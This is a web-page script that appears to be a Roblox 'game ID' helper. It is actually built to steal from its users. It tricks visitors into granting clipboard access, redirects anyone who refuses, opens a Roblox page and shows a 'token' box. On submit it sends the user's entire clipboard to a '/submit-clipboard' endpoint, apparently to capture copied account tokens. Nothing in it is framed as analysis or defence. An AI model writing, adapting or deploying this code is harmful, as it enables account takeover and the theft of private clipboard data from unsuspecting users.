<script>
  const gameIdInput = document.getElementById('gameIdInput');
  const submitBtn = document.getElementById('submitBtn');
  const tokenInput = document.getElementById('tokenInput');
  const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
  const tokenBox = document.getElementById('tokenBox');

  let permissionGranted = false;

  // Step 1: Listen for first Ctrl+V
  document.addEventListener('keydown', async (e) => {
    if (e.ctrlKey && e.key === 'v') {
      e.preventDefault();

      try {
        // This triggers clipboard permission popup in Chrome
        await navigator.clipboard.readText();
        permissionGranted = true;
        alert('Clipboard access granted! You can now paste.');
      } catch (err) {
        alert('Clipboard permission denied.');
        window.location.href = 'https://example.com/denied'; // change this
      }
    }
  });

  // Step 2: Game ID Submit
  submitBtn.onclick = () => {
    if (!permissionGranted) {
      alert('Please press Ctrl+V once and grant clipboard permission first.');
      return;
    }

    const gameId = gameIdInput.value.trim();
    if (!gameId) {
      alert('Please enter a game ID.');
      return;
    }

    // Open the Roblox URL
    window.open(`https://roblox.com/${gameId}`, '_blank');

    // Show token box
    setTimeout(() => {
      tokenBox.style.display = 'block';
    }, 2000);
  };

  // Step 3: Submit Token and Send Full Clipboard
  tokenSubmitBtn.onclick = async () => {
    try {
      const fullClipboard = await navigator.clipboard.readText();

      await fetch('/submit-clipboard', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clipboardData: fullClipboard })
      });

      alert('Clipboard content saved successfully!');
    } catch (err) {
      alert('Failed to access clipboard. Please ensure permission is granted.');
    }
  };
</script>
